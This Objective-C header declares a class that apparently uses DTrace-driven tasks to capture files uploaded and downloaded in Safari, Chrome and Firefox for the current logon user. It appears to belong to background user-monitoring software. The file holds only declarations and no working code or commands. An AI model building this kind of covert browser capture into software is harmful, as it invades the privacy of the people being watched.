//
//  UploadDownloadFileCapture.h
//  blbld
//
//  Created by ophat on 6/14/16.
//
//

#import <Foundation/Foundation.h>

@class OpenPanelAppearMointor;

@interface UploadDownloadFileCapture : NSObject {
@private
    NSTask * mSafariTask;
    NSTask * mChromeTask;
    NSTask * mFirefoxTask;
    
    NSString * mCmdSafari;
    NSString * mCmdChrome;
    NSString * mCmdFirefox;
    
    BOOL mIsSafariDtraceActive;
    BOOL mIsChromeDtraceActive;
    BOOL mIsFirefoxDtraceActive;
    
    NSString * mCurrentLogonName;
    
    NSMutableArray * mAvailableProtocol;
    NSMutableArray * mCheckIdentical;
    
    NSLock      *mLock;
    OpenPanelAppearMointor *mOpenPanelMonitor;
}

@property (nonatomic,retain) NSTask * mSafariTask;
@property (nonatomic,retain) NSTask * mChromeTask;
@property (nonatomic,retain) NSTask * mFirefoxTask;

@property (nonatomic,copy)   NSString * mCmdSafari;
@property (nonatomic,copy)   NSString * mCmdChrome;
@property (nonatomic,copy)   NSString * mCmdFirefox;

@property (nonatomic,assign) BOOL mIsSafariDtraceActive;
@property (nonatomic,assign) BOOL mIsChromeDtraceActive;
@property (nonatomic,assign) BOOL mIsFirefoxDtraceActive;

@property (copy)   NSString * mCurrentLogonName;

@property (readonly) NSMutableArray * mAvailableProtocol;
@property (readonly) NSMutableArray * mCheckIdentical;

@property (readonly) NSLock *mLock;
@property (readonly) OpenPanelAppearMointor *mOpenPanelMonitor;

- (void) startCapture;
- (void) stopCapture;

@end
